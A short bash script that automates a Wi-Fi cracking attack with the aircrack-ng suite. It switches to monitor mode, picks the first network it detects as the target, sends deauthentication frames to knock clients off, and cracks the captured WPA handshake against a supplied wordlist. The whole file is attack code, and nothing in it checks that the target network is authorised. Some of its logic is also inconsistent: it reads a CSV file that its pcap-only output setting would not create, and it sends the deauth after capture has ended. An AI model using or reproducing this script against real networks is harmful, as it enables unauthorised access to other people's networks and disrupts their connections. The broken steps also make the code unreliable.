#!/bin/bash

if [[ "$#" -ne 2 ]]; then
  echo "Usage: $0 <interface> <wordlist>"
  exit 1
fi

interface=$1
wordlist=$2
temp_dir=$(mktemp -d)

cleanup() {
  airmon-ng stop "${interface}mon" > /dev/null 2>&1
  rm -rf "$temp_dir"
}

trap 'cleanup' EXIT

airmon-ng start "$interface" > /dev/null 2>&1

airodump-ng -w "$temp_dir/dump" --output-format pcap "${interface}mon" &

airodump_pid=$!

echo "Waiting for a target network. Press Ctrl+C to stop scanning and start the attack."
wait $airodump_pid

target_bssid=$(grep -Eo '([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}' "$temp_dir/dump-01.kismet.csv" | head -n 1)
target_channel=$(grep "$target_bssid" "$temp_dir/dump-01.kismet.csv" | cut -d ',' -f 4)

kill $airodump_pid

airodump-ng -c "$target_channel" -w "$temp_dir/handshake" --bssid "$target_bssid" --output-format pcap "${interface}mon" &

airodump_pid=$!
echo "Capturing handshake for BSSID $target_bssid on channel $target_channel. Press Ctrl+C to stop capturing and start cracking."

wait $airodump_pid

aireplay-ng -0 10 -a "$target_bssid" "${interface}mon" > /dev/null 2>&1

echo "Cracking handshake with the given wordlist."

aircrack-ng -w "$wordlist" -b "$target_bssid" "$temp_dir/handshake-01.cap"

